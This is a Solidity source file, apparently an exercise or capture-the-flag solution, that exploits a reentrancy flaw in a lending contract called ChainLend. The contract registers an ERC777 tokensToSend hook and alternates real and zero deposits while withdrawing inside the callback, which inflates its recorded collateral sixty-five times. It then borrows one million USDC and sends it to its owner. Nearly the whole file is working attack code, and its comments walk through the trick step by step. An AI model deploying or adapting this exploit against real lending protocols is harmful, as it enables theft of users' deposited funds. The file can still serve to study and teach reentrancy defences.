// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/Script.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IChainLend {
    function borrow(uint256 amount) external;
    function borrowToken() external view returns (address);
    function debt(address) external view returns (uint256);
    function deposit(uint256 amount) external;
    function depositToken() external view returns (address);
    function deposits(address) external view returns (uint256);
    function repay(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract AttackChainLend {
    IERC20 imBTC;
    IERC20 usdc;
    IChainLend chainLend;
    address private owner;

    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    address private constant EIP1820_REGISTRY = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;

    uint256 private constant ONE_IMBTC = 1 * 1e8;
    uint256 private constant ONE_MILLION_USDC = 1_000_000 * 1e6;

    uint256 depositCount;

    constructor(address _imBTC, address _usdc, address _chainLend) {
        owner = msg.sender;
        imBTC = IERC20(_imBTC);
        usdc = IERC20(_usdc);
        chainLend = IChainLend(_chainLend);

        IERC1820Registry registry = IERC1820Registry(EIP1820_REGISTRY);
        registry.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
    }
    // We need 64.5 imBTC to borrow 1 M USDC according to the math in ChainLend.
    // We need to trick ChainLend that we deposited at least 64.5 imBTC
    // Deposit function is open for Reentrancy attack.

    // First deposit we will deposit 1 imBTC, nothing fancy and we won't call the tokensToSend callback.

    // Second deposit we will deposit 0 imBTC (there is no check in the ChainLend),
    // and during the deposit we have to withdraw the 1 imBTC  in the tokensToSend callback.

    // That will trick the ChainLend we still have 1 imBTC from the first deposit,
    // during the second deposit, our deposit amount would stay as 1 imBTC even though we had withdrawn that.
    // Do that 65 times and ChainLend will think we deposited 65 imBTC :)

    function attack() external {
        imBTC.approve(address(chainLend), type(uint256).max);

        for (uint256 i = 0; i < 65; i++) {
            chainLend.deposit(ONE_IMBTC);
            chainLend.deposit(0);
        }

        imBTC.approve(address(chainLend), 0);

        chainLend.borrow(ONE_MILLION_USDC);

        usdc.transfer(owner, ONE_MILLION_USDC);
        imBTC.transfer(owner, ONE_IMBTC);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        depositCount++;

        if (depositCount % 2 == 0) {
            chainLend.withdraw(ONE_IMBTC);
        }
    }
}
